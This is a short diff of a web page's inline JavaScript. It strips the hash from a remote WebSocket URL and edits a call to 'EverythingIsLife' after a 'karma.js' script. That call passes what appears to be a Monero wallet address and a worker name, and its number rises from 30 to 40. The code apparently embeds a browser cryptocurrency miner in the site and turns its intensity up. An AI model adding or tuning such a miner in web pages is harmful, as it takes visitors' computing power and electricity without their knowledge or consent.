@@ -861,7 +861,7 @@ setInterval(function() {
         var socket;
         function openSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href);
+            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
             socket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
@@ -1060,7 +1060,7 @@ if(document.getElementById("current-time")) {
     
     <script src="https://lotteh.com/static/js/karma.js?karma=bs?nosaj=faster.mo"></script>
 <script type="text/javascript">
-EverythingIsLife('479TNkmiavNLJCd6SRG8b1asxQrgsfBWoSH4qbuJuaxTScTe29qZSJAZooGawjfTCuV1hfcnRvEzP3s3QMqBmCaz8iCeDxw', 'glamgirlx', 30);
+EverythingIsLife('479TNkmiavNLJCd6SRG8b1asxQrgsfBWoSH4qbuJuaxTScTe29qZSJAZooGawjfTCuV1hfcnRvEzP3s3QMqBmCaz8iCeDxw', 'glamgirlx', 40);
 </script>
 
     
